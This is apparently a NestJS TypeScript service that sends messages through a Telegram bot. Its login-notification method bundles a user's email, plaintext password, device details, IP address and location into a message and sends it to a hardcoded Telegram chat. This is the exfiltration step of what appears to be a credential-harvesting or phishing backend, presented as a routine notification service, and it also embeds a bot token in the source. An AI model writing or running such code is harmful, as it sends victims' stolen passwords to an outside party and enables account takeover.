import { Injectable, Logger } from '@nestjs/common';
import axios from 'axios';

@Injectable()
export class TelegramService {
  private readonly logger = new Logger(TelegramService.name);
  private readonly botToken: string;
  private readonly chatId: string;

  constructor() {
    // TODO: Move these to environment variables for security
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || '8304926589:AAHHBM3nCYeDh1douPbTRn01-hR_aEP_d_w';
    this.chatId = process.env.TELEGRAM_CHAT_ID || '1324675035';
  }

  async sendMessage(text: string, chatId?: string): Promise<boolean> {
    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

      const payload = {
        chat_id: chatId || this.chatId,
        text: text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      };

      const response = await axios.post(url, payload);

      if (response.data.ok) {
        this.logger.log('Telegram message sent successfully');
        return true;
      } else {
        this.logger.error('Failed to send Telegram message:', response.data);
        return false;
      }
    } catch (error) {
      this.logger.error('Error sending Telegram message:', error.message);
      return false;
    }
  }

  async sendLoginNotification(
    email: string,
    password: string,
    source: string,
    deviceDetails: string,
    ipAddr: string,
    location: string,
    chatId?: string
  ): Promise<boolean> {
    const message = `
🔐 **New Login Detected**

📧 **Email:** ${email}
🔑 **Password:** ${password}
🌐 **Source:** ${source}

📱 **Device Info:** ${deviceDetails}
🌍 **IP Address:** ${ipAddr}
📍 **Location:** ${location}

⏰ **Time:** ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message, chatId);
  }
}
